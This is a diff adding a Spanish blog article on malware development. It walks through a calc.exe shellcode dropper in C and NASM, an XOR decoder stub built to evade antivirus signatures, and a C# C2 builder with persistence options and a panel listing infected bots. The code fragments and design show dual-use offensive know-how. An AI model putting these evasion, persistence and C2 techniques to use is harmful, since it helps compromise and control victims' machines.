@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="es" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/png" href="hat.png">
+    <link rel="apple-touch-icon" href="hat.png">    
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    
+    <title>De la Shellcode Artesanal al C2 Builder: Un Viaje por el Malware Dev | tty503</title>
+    <meta name="description" content="Análisis de la creación de un dropper de shellcode en C/Assembly para WinExec/ExitProcess y su evolución a un constructor de malware con panel C2, ofuscación y persistencia en C#.">
+    <meta name="keywords" content="shellcode, WinExec, ExitProcess, kernel32, dropper, C2, Malware Dev, C#, .NET, TCP, reverse engineering, little-endian, assembly, Mingw-w64, BugBuilder, tty503">
+    <meta name="author" content="Christian Márquez">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://tty503.com/shellcode-dropper-c2-builder">
+    <meta name="theme-color" content="#050505">
+    
+    <meta property="og:title" content="De la Shellcode Artesanal al C2 Builder | tty503">
+    <meta property="og:description" content="Deconstrucción técnica de un dropper de shellcode en C puro y su metamorfosis en un framework de malware con interfaz gráfica, servidor TCP y persistencia.">
+    <meta property="og:url" content="https://tty503.com/shellcode-dropper-c2-builder">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="tty503 Portfolio">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@tty_503">
+    <meta name="twitter:title" content="De la Shellcode Artesanal al C2 Builder">
+    <meta name="twitter:description" content="Análisis profundo del desarrollo de shellcode para Windows y su evolución hacia un builder de malware con capacidades de comando y control.">
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg-base: #030303;
+            --bg-surface: #0a0a0a;
+            --bg-card: #111111;
+            --border-subtle: #222222;
+            --border-hover: #444444;
+            --text-primary: #f5f5f5;
+            --text-secondary: #a3a3a3;
+            --text-muted: #666666;
+            --accent: #ffffff;
+            --accent-green: #4ade80;
+            --accent-blue: #60a5fa;
+            --accent-amber: #f59e0b;
+            --accent-red: #ef4444;
+            --transition-smooth: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background-color: var(--bg-base);
+            color: var(--text-primary);
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            line-height: 1.7;
+            -webkit-font-smoothing: antialiased;
+            overflow-x: hidden;
+        }
+
+        .mono {
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .noise-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+            z-index: 9999;
+            opacity: 0.05;
+            background: url('data:image/svg+xml;utf8,%3Csvg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg"%3E%3Cfilter id="noise"%3E%3CfeTurbulence type="fractalNoise" baseFrequency="0.85" numOctaves="3" stitchTiles="stitch"/%3E%3C/filter%3E%3Crect width="100%25" height="100%25" filter="url(%23noise)"/%3E%3C/svg%3E');
+        }
+
+        .navbar {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(3, 3, 3, 0.75);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-bottom: 1px solid var(--border-subtle);
+            z-index: 1000;
+            transition: var(--transition-smooth);
+        }
+
+        .nav-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 1rem 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .nav-brand {
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .nav-back {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.85rem;
+            font-weight: 500;
+            transition: var(--transition-smooth);
+        }
+
+        .nav-back:hover {
+            color: var(--accent);
+        }
+
+        .article-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 7rem 1.5rem 4rem;
+        }
+
+        .article-header {
+            margin-bottom: 3rem;
+            border-bottom: 1px solid var(--border-subtle);
+            padding-bottom: 2rem;
+        }
+
+        .article-meta {
+            display: flex;
+            gap: 1.5rem;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .article-tag {
+            background: transparent;
+            color: var(--accent-blue);
+            padding: 0.25rem 0.75rem;
+            border-radius: 3px;
+            font-size: 0.75rem;
+            border: 1px solid rgba(96, 165, 250, 0.3);
+        }
+
+        .article-title {
+            font-size: clamp(2rem, 4vw, 2.8rem);
+            font-weight: 700;
+            line-height: 1.2;
+            letter-spacing: -0.5px;
+            margin-bottom: 1rem;
+            color: var(--text-primary);
+        }
+
+        .article-subtitle {
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            line-height: 1.7;
+            max-width: 650px;
+        }
+
+        .section-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin: 2.5rem 0 1.2rem;
+            padding-top: 1rem;
+            border-top: 1px solid var(--border-subtle);
+        }
+
+        .section-title:first-of-type {
+            margin-top: 0;
+            border-top: none;
+        }
+
+        .subsection-title {
+            font-size: 1.15rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin: 2rem 0 0.8rem;
+        }
+
+        p {
+            color: var(--text-secondary);
+            margin-bottom: 1.2rem;
+            font-size: 1rem;
+            line-height: 1.8;
+        }
+
+        strong {
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        .code-block {
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: 6px;
+            padding: 1.2rem 1.5rem;
+            margin: 1.5rem 0;
+            overflow-x: auto;
+            font-size: 0.9rem;
+            line-height: 1.6;
+            position: relative;
+            font-family: 'JetBrains Mono', monospace;
+            color: var(--text-secondary);
+        }
+
+        .code-block .line {
+            display: block;
+        }
+
+        .code-block .comment { color: #6a9955; }
+        .code-block .directive { color: #569cd6; }
+        .code-block .keyword { color: #c586c0; }
+        .code-block .string { color: #ce9178; }
+        .code-block .number { color: #b5cea8; }
+        .code-block .opcode { color: #4ec9b0; }
+        .code-block .register { color: #9cdcfe; }
+        .code-block .label { color: #dcdcaa; }
+
+        .table-wrapper {
+            overflow-x: auto;
+            margin: 2rem 0;
+            border: 1px solid var(--border-subtle);
+            border-radius: 6px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.85rem;
+        }
+
+        th {
+            background: var(--bg-card);
+            color: var(--text-primary);
+            padding: 0.8rem 1rem;
+            text-align: left;
+            font-weight: 600;
+            border-bottom: 1px solid var(--border-hover);
+            white-space: nowrap;
+        }
+
+        td {
+            padding: 0.7rem 1rem;
+            color: var(--text-secondary);
+            border-bottom: 1px solid var(--border-subtle);
+            vertical-align: top;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover td {
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        ul, ol {
+            color: var(--text-secondary);
+            margin: 1rem 0 1.5rem 1.5rem;
+            line-height: 1.8;
+        }
+
+        li {
+            margin-bottom: 0.5rem;
+        }
+
+        ul ul {
+            margin: 0.5rem 0 0.5rem 1.5rem;
+        }
+
+        .image-container {
+            margin: 2rem 0;
+            border: 1px solid var(--border-subtle);
+            border-radius: 6px;
+            overflow: hidden;
+            background: var(--bg-card);
+        }
+
+        .image-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+            filter: grayscale(30%) contrast(1.05);
+            transition: filter 0.4s ease;
+        }
+
+        .image-container img:hover {
+            filter: grayscale(0%) contrast(1.1);
+        }
+
+        .image-caption {
+            padding: 0.8rem 1rem;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            border-top: 1px solid var(--border-subtle);
+        }
+
+        .callout {
+            background: var(--bg-card);
+            border-left: 3px solid var(--accent-blue);
+            padding: 1.2rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 6px 6px 0;
+        }
+
+        .callout-title {
+            font-weight: 600;
+            color: var(--accent-blue);
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+        }
+
+        .callout p {
+            margin-bottom: 0;
+            font-size: 0.95rem;
+        }
+
+        .callout-warning {
+            border-left-color: var(--accent-amber);
+        }
+
+        .callout-warning .callout-title {
+            color: var(--accent-amber);
+        }
+
+        a {
+            color: var(--accent-blue);
+            text-decoration: none;
+            transition: var(--transition-smooth);
+            word-break: break-word;
+        }
+
+        a:hover {
+            color: var(--accent);
+        }
+
+        .footer {
+            border-top: 1px solid var(--border-subtle);
+            padding: 3rem 1.5rem;
+            text-align: center;
+            background: var(--bg-surface);
+        }
+
+        .footer-content {
+            max-width: 900px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .social-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.85rem;
+            transition: var(--transition-smooth);
+        }
+
+        .social-links a:hover {
+            color: var(--text-primary);
+        }
+
+        .copyright {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+        }
+
+        @media (max-width: 600px) {
+            .article-container {
+                padding: 6rem 1rem 3rem;
+            }
+            .article-title {
+                font-size: 1.6rem;
+            }
+            .section-title {
+                font-size: 1.25rem;
+            }
+            .code-block {
+                padding: 1rem;
+                font-size: 0.8rem;
+            }
+            th, td {
+                padding: 0.5rem 0.6rem;
+                font-size: 0.75rem;
+            }
+            .social-links {
+                gap: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="noise-overlay"></div>
+
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="https://tty503.com" class="nav-brand mono">tty503 <span style="color: var(--text-secondary); font-size: 0.85rem;">_research</span></a>
+            <a href="https://tty503.com" class="nav-back mono">← Volver al portafolio</a>
+        </div>
+    </nav>
+
+    <article class="article-container">
+        <header class="article-header">
+            <div class="article-meta mono">
+                <span class="article-tag">Malware Dev</span>
+                <span class="article-tag">Shellcode</span>
+                <span class="article-tag">C#/.NET</span>
+                <span>Actualizado: Mayo 2026</span>
+                <span>~55 min de lectura</span>
+            </div>
+            <h1 class="article-title">De la Shellcode Artesanal al C2 Builder: Anatomía de un Dropper y su Metamorfosis en Framework</h1>
+            <p class="article-subtitle">
+                Análisis de la creación de un dropper de shellcode en C puro y Assembly (WinExec/ExitProcess), el desarrollo de un stub criptográfico en NASM, y la evolución hacia un constructor de malware con panel C2, ofuscación y persistencia en C#.
+            </p>
+        </header>
+
+        <!-- ==================== SECCIÓN 1: FUNDAMENTOS ==================== -->
+        <h2 class="section-title mono"><span style="color: var(--text-muted);">01.</span> Fase 1: El Arte de la Shellcode Artesanal (hace 3 años)</h2>
+        
+        <h3 class="subsection-title">La filosofía del dropper manual</h3>
+        <p>
+            El punto de partida no fue un builder con interfaz gráfica, sino un <strong>dropper puro en C</strong>. El objetivo era claro: escribir una shellcode capaz de lanzar un ejecutable (<span class="mono">calc.exe</span>) y finalizar limpiamente el proceso llamando a <span class="mono">WinExec</span> y <span class="mono">ExitProcess</span>. No se trataba de evadir AV, sino de <strong>entender la anatomía de una shellcode</strong>: cómo se posiciona en memoria, cómo resuelve las direcciones de la API de Windows, y cómo se pasa el control al flujo de ejecución modificado.
+        </p>
+
+        <h3 class="subsection-title">El stub: De C a Assembly</h3>
+        <p>
+            Para generar los opcodes, primero escribimos la lógica en C estándar. Este archivo (<span class="mono">stub_shellcode.c</span>) sirve como molde conceptual para entender qué queremos que haga el código a bajo nivel.
+        </p>
+
+        <div class="code-block">
+            <span class="line"><span class="comment">// stub_shellcode.c</span></span>
+            <span class="line"><span class="comment">// Código de referencia para la shellcode final</span></span>
+            <span class="line"><span class="directive">#include</span> <span class="string">&lt;windows.h&gt;</span></span>
+            <span class="line">&nbsp;</span>
+            <span class="line"><span class="keyword">int</span> <span class="label">main</span>(<span class="keyword">void</span>) {</span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="label">WinExec</span>(<span class="string">"calc.exe"</span>, <span class="number">0</span>);</span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="label">ExitProcess</span>(<span class="number">0</span>);</span>
+            <span class="line">}</span>
+        </div>
+
+        <p>
+            A partir de este código, la tarea de ingeniería inversa consistió en traducir esto a Assembly NASM. Creamos <span class="mono">stub_shellcode.asm</span>, donde definimos manualmente la pila, pusheamos la cadena <span class="mono">"calc.exe"</span> en formato little-endian y configuramos los registros para la llamada a la API.
+        </p>
+
+        <div class="code-block">
+            <span class="line"><span class="comment">; stub_shellcode.asm (Fragmento clave)</span></span>
+            <span class="line"><span class="comment">; Construcción del string "calc.exe" en la pila</span></span>
+            <span class="line"><span class="opcode">xor</span>  <span class="register">ecx</span>, <span class="register">ecx</span></span>
+            <span class="line"><span class="opcode">push</span> <span class="register">ecx</span>                <span class="comment">; Null terminator</span></span>
+            <span class="line"><span class="opcode">push</span> <span class="number">0x6578652e</span>         <span class="comment">; "exe." (little-endian)</span></span>
+            <span class="line"><span class="opcode">push</span> <span class="number">0x636c6163</span>         <span class="comment">; "calc"</span></span>
+            <span class="line"><span class="opcode">mov</span>  <span class="register">eax</span>, <span class="register">esp</span>           <span class="comment">; EAX apunta a "calc.exe"</span></span>
+        </div>
+
+        <div class="callout">
+            <div class="callout-title mono">NOTA: Little-Endian en la práctica</div>
+            <p>Para pasar "calc.exe" a la pila en x86, es necesario invertir el orden de los bytes. La shellcode no usa APIs de alto nivel para strings; todo son bytes crudos empujados a mano. Esto es fundamental para que la shellcode sea independiente de la posición y no dependa de secciones de datos.</p>
+        </div>
+
+        <!-- ==================== SECCIÓN 2: EL CORE DEL DROPPER ==================== -->
+        <h2 class="section-title mono"><span style="color: var(--text-muted);">02.</span> Resolución Dinámica de la API (GetProcAddress)</h2>
+
+        <p>
+            Para que nuestra shellcode funcione en diferentes versiones de Windows (o con diferentes parches), no podemos hardcodear las direcciones de <span class="mono">WinExec</span> o <span class="mono">ExitProcess</span>. Aquí entra en juego la técnica de <strong>resolución dinámica en tiempo de ejecución</strong>.
+        </p>
+
+        <h3 class="subsection-title">Obtención de la dirección base de kernel32.dll</h3>
+        <p>
+            Utilizamos <span class="mono">GetModuleHandle("kernel32.dll")</span> para obtener la dirección base en memoria de la DLL. Kernel32 es la piedra angular de la API de Windows y siempre está cargada en el espacio de memoria de los procesos de usuario. A diferencia del PEB (Process Environment Block) walking en shellcode pura, aquí aprovechamos que el dropper es un ejecutable compilado y podemos usar la API de Windows antes de saltar al código malicioso.
+        </p>
+
+        <h3 class="subsection-title">La herejía del formateo en el arreglo</h3>
+        <p>
+            Una vez que tenemos las direcciones <span class="mono">winexec_addr</span> y <span class="mono">exitprocess_addr</span>, debemos parcharlas dentro de nuestro arreglo de shellcode. Aquí nos enfrentamos a un detalle técnico crucial: el procesador x86 es <strong>little-endian</strong>. Si la función <span class="mono">GetProcAddress</span> nos devuelve una dirección como <span class="mono">0xAF5477FF</span>, debemos guardarla en el arreglo de shellcode como <span class="mono">0xFF, 0x77, 0x54, 0xAF</span>.
+        </p>
+        <p>
+            Para ello, aplicamos máscaras de bits y desplazamientos para extraer cada byte de la dirección y colocarlo en la posición correcta del arreglo. Esta técnica es la que permite que el <span class="mono">call ebx</span> de nuestra shellcode aterrice en la dirección correcta de WinExec. Es un error común en principiantes olvidar este paso y terminar con una shellcode que salta a direcciones de memoria corruptas, provocando un crash inmediato.
+        </p>
+
+        <div class="code-block">
+            <span class="line"><span class="comment">// Fragmento de misc.c: Parcheo de la shellcode</span></span>
+            <span class="line"><span class="comment">// Invertimos los bytes para cumplir con little-endian</span></span>
+            <span class="line">shellcode[<span class="number">18</span>+<span class="number">1</span>] = (*winexec_addr & <span class="number">0x000000FF</span>); </span>
+            <span class="line">shellcode[<span class="number">18</span>+<span class="number">2</span>] = (*winexec_addr & <span class="number">0x0000FF00</span>) >> <span class="number">8</span>;</span>
+            <span class="line">shellcode[<span class="number">18</span>+<span class="number">3</span>] = (*winexec_addr & <span class="number">0x00FF0000</span>) >> <span class="number">16</span>;</span>
+            <span class="line">shellcode[<span class="number">18</span>+<span class="number">4</span>] = (*winexec_addr & <span class="number">0xFF000000</span>) >> <span class="number">24</span>; </span>
+        </div>
+
+        <!-- ==================== SECCIÓN 3: DESPLIEGUE ==================== -->
+        <h2 class="section-title mono"><span style="color: var(--text-muted);">03.</span> El Arte del Despliegue: Punteros a Función</h2>
+
+        <p>
+            El archivo <span class="mono">run.c</span> contiene el mecanismo de lanzamiento. Declaramos un puntero a función (<span class="mono">int(*func)()</span>) y le asignamos la dirección de memoria de nuestro arreglo <span class="mono">shellcode</span>.
+        </p>
+        <p>
+            Al hacer el casting <span class="mono">func = (int(*)())shellcode;</span> y posteriormente llamar a <span class="mono">func()</span>, estamos obligando al procesador a saltar a nuestra región de datos y ejecutar esos bytes como si fueran código. Esto es la esencia de un dropper: no hay inyección en otro proceso, solo ejecución directa.
+        </p>
+        <p>
+            Sin embargo, esta técnica tiene una limitación importante: <strong>la región de memoria donde reside el arreglo debe tener permisos de ejecución</strong>. En sistemas modernos con DEP (Data Execution Prevention) habilitado, esto requeriría un paso previo con <span class="mono">VirtualProtect</span> para marcar la página de memoria como ejecutable. En su momento, la PoC se probó en un entorno controlado sin DEP para validar la lógica de la shellcode antes de añadir esa capa de evasión.
+        </p>
+
+        <div class="callout callout-warning">
+            <div class="callout-title mono">Diferenciación: Dropper vs Exploit</div>
+            <p>Esta técnica es un "dropper". No estamos secuestrando el registro EIP mediante un buffer overflow. Simplemente estamos cargando un arreglo de bytes ejecutables en memoria y redirigiendo el flujo de ejecución hacia él. Es una técnica más ruidosa pero más controlada. En un exploit real, la shellcode se inyecta en otro proceso o se ejecuta tras corromper la pila.</p>
+        </div>
+
+        <!-- ==================== SECCIÓN 4: EL STUB CRIPTOGRÁFICO ==================== -->
+        <h2 class="section-title mono"><span style="color: var(--text-muted);">04.</span> Ofuscación Avanzada: El Stub Criptográfico en NASM</h2>
+
+        <p>
+            Mientras el builder en C# resolvía el problema de la generación de payloads, surgió una cuestión más fundamental: ¿cómo proteger la shellcode en reposo? A finales de 2025, me planteé crear un <strong>stub descifrador en Assembly puro</strong>. La idea era simple: la shellcode real viaja cifrada (con un esquema de claves dinámicas), y un pequeño stub en NASM se encarga de descifrarla en tiempo de ejecución antes de saltar a ella. El objetivo era doble: evadir firmas estáticas y añadir una capa de ofuscación que complicara el análisis forense.
+        </p>
+
+        <h3 class="subsection-title">El payload de prueba (Linux x86)</h3>
+        <p>
+            Para esta prueba de concepto, utilicé un payload mínimo que ejecuta una syscall de salida en Linux (<span class="mono">exit(10+22)</span>). La shellcode en bruto es la siguiente:
+        </p>
+        <div class="code-block">
+            <span class="line"><span class="comment">// Shellcode: mov ebx, 10; add ebx, 22; mov eax, 1; int 0x80</span></span>
+            <span class="line"><span class="keyword">static</span> <span class="keyword">unsigned char</span> raw[] = {</span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="number">0xBB</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="number">0x83</span>, <span class="number">0xC3</span>, <span class="number">0x16</span>, </span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="number">0xB8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="number">0xCD</span>, <span class="number">0x80</span>,</span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="number">0x90</span> <span class="comment">// NOP padding</span></span>
+            <span class="line">};</span>
+        </div>
+
+        <h3 class="subsection-title">La lógica de descifrado (Bloques XOR con mutación)</h3>
+        <p>
+            El stub en NASM utiliza un algoritmo de descifrado por bloques. En lugar de un simple XOR estático, implementé una mezcla de operaciones para cada bloque de 4 bytes: <strong>A ^ B + (C - 1) - (D + 1)</strong>. Los datos cifrados se almacenan en la sección <span class="mono">.data</span> y el stub reserva un buffer en <span class="mono">.bss</span>.
+        </p>
+        <p>
+            La lógica es particularmente interesante porque no depende de constantes fijas globales; cada bloque tiene su propio conjunto de claves (A, B, C, D), lo que permite generar un stub personalizado para cada payload, dificultando la creación de firmas estáticas por parte de los AV. La elección de las operaciones (XOR, decremento, incremento, resta) no es arbitraria: se busca una mezcla de operaciones aritméticas y lógicas que no sea trivial de simplificar por un motor de análisis estático.
+        </p>
+
+        <div class="code-block">
+            <span class="line"><span class="comment">; ASM resultante del stub descifrador</span></span>
+            <span class="line"><span class="label">decode_loop:</span></span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="opcode">mov</span> <span class="register">eax</span>, [<span class="register">esi</span>]       <span class="comment">; A</span></span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="opcode">mov</span> <span class="register">ebx</span>, [<span class="register">esi</span>+<span class="number">4</span>]     <span class="comment">; B</span></span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="opcode">mov</span> <span class="register">edx</span>, [<span class="register">esi</span>+<span class="number">8</span>]     <span class="comment">; C</span></span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="opcode">mov</span> <span class="register">ebp</span>, [<span class="register">esi</span>+<span class="number">12</span>]    <span class="comment">; D</span></span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="opcode">xor</span> <span class="register">eax</span>, <span class="register">ebx</span>         <span class="comment">; A ^ B</span></span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="opcode">dec</span> <span class="register">edx</span>              <span class="comment">; C - 1</span></span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="opcode">add</span> <span class="register">eax</span>, <span class="register">edx</span>         <span class="comment">; + (C-1)</span></span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="opcode">inc</span> <span class="register">ebp</span>              <span class="comment">; D + 1</span></span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="opcode">sub</span> <span class="register">eax</span>, <span class="register">ebp</span>         <span class="comment">; - (D+1)</span></span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="opcode">mov</span> [<span class="register">edi</span>], <span class="register">eax</span>       <span class="comment">; Escribir opcode restaurado</span></span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="opcode">jmp</span> <span class="label">decoded_buffer</span>   <span class="comment">; Transferencia de control al payload</span></span>
+        </div>
+
+        <div class="callout callout-warning">
+            <div class="callout-title mono">Advertencia de portabilidad</div>
+            <p>Este stub está escrito para la convención de syscalls de Linux x86 (<span class="mono">int 0x80</span>). La diferencia clave con el mundo Windows es el uso de interrupciones de software vs. llamadas a la API kernel32. Sin embargo, la técnica de descifrado XOR por bloques es completamente portable a Windows si se ajusta la shellcode objetivo y se reemplaza la syscall de salida por una llamada a <span class="mono">ExitProcess</span>.</p>
+        </div>
+
+        <!-- ==================== SECCIÓN 5: LA EVOLUCIÓN AL BUILDER ==================== -->
+        <h2 class="section-title mono"><span style="color: var(--text-muted);">05.</span> Fase 2: BugBuilder — Automatización y C2 (hace 2 años)</h2>
+
+        <p>
+            La shellcode manual era poderosa pero impráctica para operaciones a gran escala. La evolución lógica fue <strong>BugBuilder</strong>, un proyecto en C# (.NET Framework) que traslada el concepto de dropper a un entorno de construcción visual con panel de control.
+        </p>
+
+        <h3 class="subsection-title">El motor de compilación interno: Roslyn y CodeDOM</h3>
+        <p>
+            Uno de los mayores desafíos técnicos fue <strong>generar un ejecutable sin tener un compilador externo instalado</strong>. La solución residió en incrustar el compilador de C# dentro del builder. Para ello, se evaluaron dos enfoques:
+        </p>
+        <ul>
+            <li><strong>CodeDOM (Code Document Object Model):</strong> Permite generar código fuente y compilarlo en tiempo de ejecución usando el proveedor <span class="mono">CSharpCodeProvider</span>. Es la opción más portable y la que se utilizó en la PoC inicial.</li>
+            <li><strong>Roslyn (Microsoft.CodeAnalysis.CSharp):</strong> El compilador moderno de C# como servicio, que ofrece un control más granular sobre la sintaxis y los árboles de expresión. Ideal para payloads más complejos que requieren características modernas del lenguaje.</li>
+        </ul>
+        <p>
+            El código fuente de la carga útil se mantenía como un <strong>recurso embebido en el ensamblado</strong>, y se reemplazaban marcadores de posición (placeholders) con las configuraciones del usuario (IP, puerto, métodos de ofuscación) antes de la compilación. Esto permitía generar un binario único para cada campaña sin necesidad de herramientas externas.
+        </p>
+
+        <h3 class="subsection-title">Arquitectura del proyecto</h3>
+        <p>
+            BugBuilder se divide en dos componentes principales:
+        </p>
+        <ul>
+            <li><strong>El Builder (Cliente):</strong> Una interfaz Windows Forms donde el operador configura el payload. Se selecciona el icono, el nombre del archivo, y se activan opciones de persistencia (registros, startup folder, copias). Se integran módulos de ofuscación y encoding de tráfico.</li>
+            <li><strong>El Servidor C2:</strong> Un listener TCP asíncrono que recibe conexiones de los clientes infectados. Los datos se transmiten en formato JSON, facilitando el parseo de la información del bot (IP, país, SO, usuario, ping).</li>
+        </ul>
+
+        <h3 class="subsection-title">El protocolo de comunicación TCP</h3>
+        <p>
+            A diferencia del dropper original que solo ejecutaba <span class="mono">calc.exe</span>, BugBuilder establece un canal de persistencia. El cliente malicioso se conecta al servidor, serializa un objeto <span class="mono">ModelInfo</span> a JSON y lo envía. La elección de JSON sobre formatos binarios fue pragmática: facilita la depuración, es legible por humanos durante el desarrollo, y es trivial de parsear en ambos extremos con Newtonsoft.Json.
+        </p>
+
+        <div class="code-block">
+            <span class="line"><span class="comment">// Estructura del dato exfiltrado (ModelInfo)</span></span>
+            <span class="line"><span class="keyword">public class</span> <span class="label">ModelInfo</span> {</span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">public string</span> ip { <span class="keyword">get</span>; <span class="keyword">set</span>; }</span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">public string</span> country { <span class="keyword">get</span>; <span class="keyword">set</span>; }</span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">public string</span> user_pc { <span class="keyword">get</span>; <span class="keyword">set</span>; }</span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">public bool</span> status { <span class="keyword">get</span>; <span class="keyword">set</span>; }</span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">public string</span> operatingSystem { <span class="keyword">get</span>; <span class="keyword">set</span>; }</span>
+            <span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">public int</span> ping { <span class="keyword">get</span>; <span class="keyword">set</span>; }</span>
+            <span class="line">}</span>
+            <span class="line">&nbsp;</span>
+            <span class="line"><span class="comment">// Envío al servidor</span></span>
+            <span class="line"><span class="keyword">string</span> json = <span class="label">JsonConvert</span>.<span class="label">SerializeObject</span>(modelInfo);</span>
+            <span class="line">stream.<span class="label">Write</span>(<span class="label">Encoding</span>.UTF8.<span class="label">GetBytes</span>(json), <span class="number">0</span>, json.Length);</span>
+        </div>
+
+        <h3 class="subsection-title">El Panel de Control (C2)</h3>
+        <p>
+            El operador utiliza una ventana con pestañas:
+        </p>
+        <ul>
+            <li><strong>Builder:</strong> Configuración del payload. Incluye parámetros de red (Host/IP, Puerto) y técnicas de evasión como la compresión del tráfico o el cifrado (XOR, AES, RSA).</li>
+            <li><strong>Infected:</strong> Un grid en tiempo real que muestra los bots conectados, ordenados por IP, País, Usuario, Sistema Operativo y latencia (Ping).</li>
+        </ul>
+
+        <div class="callout">
+            <div class="callout-title mono">Evidencia de madurez técnica</div>
+            <p>La inclusión de opciones como LZMA, GZip, Huffman, o diferentes esquemas de cifrado demuestran una transición desde una PoC académica a una herramienta orientada a operaciones que enfrenta entornos defendidos por firewalls e IDS. La variabilidad del payload es clave para evadir firmas estáticas.</p>
+        </div>
+
+        <!-- ==================== SECCIÓN 6: BITÁCORA DE DESARROLLO ==================== -->
+        <h2 class="section-title mono"><span style="color: var(--text-muted);">06.</span> Bitácora de Desarrollo: De la Idea al GridView</h2>
+
+        <p>
+            La construcción del builder no fue un proceso lineal. Rescatando los registros de chat originales, se puede trazar la evolución del pensamiento técnico:
+        </p>
+
+        <h3 class="subsection-title">La semilla de la idea (Enero 2024)</h3>
+        <p>
+            El problema inicial era claro: generar un <span class="mono">.exe</span> sin un compilador externo. La solución consistió en incrustar todo lo necesario dentro del ensamblado del builder, utilizando el compilador de C# en memoria y manteniendo el código fuente de la carga útil como strings de recursos.
+        </p>
+        <div class="code-block">
+            <span class="line"><span class="comment">// Log: 23/1/24 5:42 a. m.</span></span>
+            <span class="line"><span class="string">"Lo primero que logre hacer, fue un modulo que genere un .exe sin necesidad de que se tenga un compilador instalado ni las fuentes, todo esta dentro del Builder."</span></span>
+        </div>
+        <p>
+            El siguiente paso fue diseñar la UI. La meta era una interfaz modular donde el usuario pudiera personalizar cada aspecto del binario de salida, desde el ícono hasta los métodos de ofuscación del tráfico. La arquitectura de compilación interna (CodeDOM) fue clave para esta etapa.
+        </p>
